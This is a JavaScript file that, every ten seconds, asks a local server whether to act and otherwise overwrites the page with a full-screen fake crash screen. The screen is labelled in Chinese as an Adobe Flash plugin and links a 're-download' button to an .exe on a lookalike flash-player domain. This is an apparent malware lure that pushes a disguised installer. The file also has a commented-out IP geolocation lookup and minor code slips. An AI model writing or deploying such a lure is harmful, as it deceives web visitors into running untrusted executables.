var html = `
<!DOCTYPE html>
<html lang="en" id="hhhh">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
	/*  公共样式 不是必须*/
	*{
		padding:0;
		margin:0;
	}
	/*  奔溃页面样式 */
	.whole-error-container{
		position: fixed;
		left:0;
		top:0;
		width:100%;
		height:100%;
		z-index: 8000;
		background: #7a7a7a;
	}
	.whole-error-content{
		position: fixed;
		left:50%;
		top: 50%;
		-webkit-transform: translate(-50%, -50%);
		-ms-transform: translate(-50%, -50%);
		-moz-transform: translate(-50%, -50%);
		transform: translate(-50%, -50%);
	}
	.whole-error-icon{
		display:block;
		margin:0 auto;
		width:48px;
	}
	.whole-error-info{
		font-size:14px;
		color:#eee;
		text-align: center;
		padding-top:10px;
	}
	.whole-error-link-box{
		padding-top:5px;
		text-align: center;
	}
	.whole-error-link{
		color:#eee;
		font-size:14px;
		text-decoration: underline;
	}
</style>
</head>

<body>
	<div class="whole-error-container">
		<div class="whole-error-content">
			<img class="whole-error-icon" src="data:image/png;base64,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" alt="">
			<p class="whole-error-info">插件Adobe Flash</p>
			<div class="whole-error-link-box">
				<a class="whole-error-link" href="https://www.flash-player.us/flashplayerpp_install_cn.exe">重新下载</a>
			</div>
		</div>
	</div>
</body>

</html>";
`;


function ajax(type, url, success) {
    if (window.XMLHttpRequest) {
        var oajax = new XMLHttpRequest()
    } else {
        var oajax = new ActiveXObject("Microsoft.XMLHTTP");
    }
    oajax.open(type, url, true);
    oajax.send();
    oajax.onreadystatechange = function () {
        if (oajax.readyState == 4) {
            if (oajax.status == 200 || oajax.status == 304) {
                success && success(oajax.responseText);
            }
        }
    }
}

// ajax("get", "http://ip-api.com/csv", function (res) {
//     console.log(res)
// })

function ajax(type, url, success) {
    if (window.XMLHttpRequest) {
        var oajax = new XMLHttpRequest()
    } else {
        var oajax = new ActiveXObject("Microso.XMLHttp")
    }
    oajax.open(type, url, true)
    oajax.send()

    return new Promise(function (resolve, reject) {
        oajax.onreadystatechange = function () {
            if (oajax.readyState == 4) {
                if (oajax.status == 200 || oajax.status == 304) {
                    resolve(oajax.responseText)
                } else {
                    reject(oajax.status)
                }
            }
        }
    })
}

async function fun() {
    let data = await ajax('get', 'http://127.0.0.1:8888/reg')
    console.log(data)
    if (data == 1) {
        location.reload();
    }
    //    html=unescape(html);
    document.body.innerHTML = html;
    const scripts = document.body.querySelectorAll('script');
    for (let script of scripts) {
        console.log(script)
        runScript(script);
    }

}

// fun()

window.setInterval(function () {
    fun()
}, 10000);
